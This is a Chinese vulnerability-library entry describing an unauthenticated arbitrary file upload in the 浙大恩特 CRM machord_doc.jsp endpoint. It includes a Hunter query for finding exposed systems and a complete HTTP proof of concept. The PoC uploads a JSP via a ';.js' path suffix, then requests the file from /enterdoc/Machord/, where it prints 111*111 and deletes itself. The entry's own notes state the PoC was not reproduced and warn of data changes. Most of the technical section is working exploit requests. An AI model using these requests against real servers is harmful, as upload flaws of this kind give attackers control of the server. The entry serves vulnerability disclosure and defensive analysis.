---
source: "wy876 漏洞文库"
title: "浙大恩特CRM Storage machord_doc上传JSP"
product: "浙大恩特CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "entsoft_en上下文、Machord目录/JSP解析，版本未知"
prerequisites: ";.js路径后缀，未带Cookie"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ey7q3elsbgbv3mnc"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMmachord_doc%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name=\"浙大恩特 CRM\""
id: "vw-806064bc13598e62c6c6a1de"
entity_id: "ve-806064bc13598e62c6c6a1de"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# 浙大恩特CRM Storage machord_doc上传JSP

> 指纹历史字段校订（2026-10-04）：现有完整平台查询保持原值；旧未核字段中的残片逐字迁入 `previous_*`。此迁移不代表已确定原文其他谓词的组合意图，未给出的 AND/OR 不猜补。后文残片字段的旧诊断描述校订前状态，查询仍不证明资产受影响。

## 条目说明

- 对象与具体问题：浙大恩特CRM；Storage machord_doc上传JSP
- 版本、配置及部署条件：entsoft_en上下文、Machord目录/JSP解析，版本未知
- 认证与权限前提：;.js路径后缀，未带Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 有上传和访问两请求但无乘法返回，仍未证执行；自删不免除覆盖/执行风险
- formID upload、machordernum/gesnum空值是具体业务前提需要说明
- 同419等不同业务上传模块应保留，不按相同JSP检测体合并；补修复和版本

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM machord_doc存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

## 二、影响版本
+ 浙大恩特CRM

## 三、资产测绘
+ hunter`app.name="浙大恩特 CRM"`
+ 特征


## 四、漏洞复现
```http
POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum&fileName=stc.jsp&strAffixStr&oprfilenam=null&gesnum HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 575
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="oprfilenam"

null
--00content0boundary00
Content-Disposition: form-data; name="uploadflg"

0
--00content0boundary00
Content-Disposition: form-data; name="strAffixStr"


--00content0boundary00
Content-Disposition: form-data; name="selfilenam"


--00content0boundary00
Content-Disposition: form-data; name="uploadfile"; filename="stc.jsp"
Content-Type: image/png

<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--00content0boundary00--
```

> 请求长度说明：原资料 Content-Length 为 575；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件位置

```http
GET /enterdoc/Machord/stc.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ey7q3elsbgbv3mnc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
